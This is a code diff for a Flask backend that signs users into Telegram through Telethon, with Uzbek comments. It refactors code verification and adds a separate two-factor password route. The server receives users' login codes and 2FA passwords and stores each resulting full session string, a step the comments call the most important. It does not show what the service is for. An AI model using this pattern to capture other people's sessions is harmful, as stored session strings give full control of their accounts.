@@ -82,68 +82,160 @@ def send_code():
 # =====================
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
-    phone = request.json.get("phone")
-    code = request.json.get("code")
-    password = request.json.get("password")  # 2FA bo‘lsa
+    data = request.json
+    phone = data.get("phone")
+    code = data.get("code")
 
     if not phone or not code:
-        return jsonify({"status": "error", "message": "Ma’lumot yetarli emas"}), 400
+        return jsonify({
+            "status": "error",
+            "message": "Telefon yoki kod yo‘q"
+        }), 400
 
+    # 1️⃣ login_attempts dan HASH + SESSION olamiz
     attempt = get_login_attempt(phone)
     if not attempt:
         return jsonify({
             "status": "error",
-            "message": "Login vaqti tugagan. Qayta kod so‘rang."
+            "message": "Kod muddati o‘tgan yoki topilmadi"
         }), 400
 
     phone_code_hash, session_string = attempt
 
     async def _verify():
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        client = TelegramClient(
+            StringSession(session_string),
+            API_ID,
+            API_HASH
+        )
         await client.connect()
-        try:
-            try:
-                await client.sign_in(
-                    phone=phone,
-                    code=code,
-                    phone_code_hash=phone_code_hash
-                )
-            except SessionPasswordNeededError:
-                if not password:
-                    return ("2fa_required", None)
 
-                await client.sign_in(password=password)
+        try:
+            await client.sign_in(
+                phone=phone,
+                code=code,
+                phone_code_hash=phone_code_hash
+            )
 
             user = await client.get_me()
             final_session = client.session.save()
-            return (user, final_session)
+
+            return user, final_session
 
         finally:
             await client.disconnect()
 
     try:
-        result = asyncio.run(_verify())
+        user, final_session = asyncio.get_event_loop().run_until_complete(_verify())
 
-        if result[0] == "2fa_required":
-            return jsonify({"status": "2fa_required"}), 200
+        # 2️⃣ USER SESSION saqlaymiz (ENG MUHIM QISM)
+        save_user_session(user.id, final_session)
 
-        user, session_string = result
+        # 3️⃣ USER METADATA (adminbot/stat uchun)
+        save_user(
+            user_id=user.id,
+            phone=phone,
+            username=user.username
+        )
 
-        # 🔐 DB GA YOZAMIZ
-        save_user(user.id, phone, user.username)
-        save_user_session(user.id, session_string)
-
-        # 🧹 TEMP LOGINNI O‘CHIRAMIZ
+        # 4️⃣ LOGIN ATTEMPT tozalaymiz
         delete_login_attempt(phone)
 
         return jsonify({"status": "ok"}), 200
 
     except PhoneCodeInvalidError:
-        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"}), 400
+        return jsonify({
+            "status": "error",
+            "message": "Kod noto‘g‘ri"
+        }), 400
+
+    except SessionPasswordNeededError:
+        return jsonify({
+            "status": "2fa_required"
+        }), 200
 
     except Exception as e:
         print("VERIFY_CODE ERROR:", repr(e))
-        return jsonify({"status": "error", "message": "Server xatosi"}), 500
+        return jsonify({
+            "status": "error",
+            "message": "Telegram login xatosi"
+        }), 500
+
+from telethon.errors import PasswordHashInvalidError
+
+@app.route("/verify_password", methods=["POST"])
+def verify_password():
+    data = request.json
+    phone = data.get("phone")
+    password = data.get("password")
+
+    if not phone or not password:
+        return jsonify({
+            "status": "error",
+            "message": "Telefon yoki parol yo‘q"
+        }), 400
+
+    # 1️⃣ login_attempts dan session olamiz
+    attempt = get_login_attempt(phone)
+    if not attempt:
+        return jsonify({
+            "status": "error",
+            "message": "Login sessiya topilmadi"
+        }), 400
+
+    phone_code_hash, session_string = attempt
+
+    async def _verify_password():
+        client = TelegramClient(
+            StringSession(session_string),
+            API_ID,
+            API_HASH
+        )
+        await client.connect()
+
+        try:
+            await client.sign_in(password=password)
+
+            user = await client.get_me()
+            final_session = client.session.save()
+
+            return user, final_session
+
+        finally:
+            await client.disconnect()
+
+    try:
+        user, final_session = asyncio.get_event_loop().run_until_complete(
+            _verify_password()
+        )
+
+        # 🔐 USER SESSION saqlaymiz
+        save_user_session(user.id, final_session)
+
+        # 👤 USER METADATA
+        save_user(
+            user_id=user.id,
+            phone=phone,
+            username=user.username
+        )
+
+        delete_login_attempt(phone)
+
+        return jsonify({"status": "ok"}), 200
+
+    except PasswordHashInvalidError:
+        return jsonify({
+            "status": "error",
+            "message": "Parol noto‘g‘ri"
+        }), 400
+
+    except Exception as e:
+        print("VERIFY_PASSWORD ERROR:", repr(e))
+        return jsonify({
+            "status": "error",
+            "message": "2FA login xatosi"
+        }), 500
+
 
 
 # =====================
